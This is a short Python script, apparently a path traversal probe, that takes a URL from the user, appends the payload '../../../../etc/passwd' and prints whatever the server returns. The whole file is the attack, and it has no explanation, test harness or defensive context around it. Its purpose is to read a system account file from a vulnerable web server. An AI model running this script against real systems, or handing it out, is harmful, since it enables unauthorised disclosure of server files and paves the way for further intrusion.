import requests

url = input("URL: ")
payload = "../../../../etc/passwd"

response = requests.get(url + payload)
print(response.text)
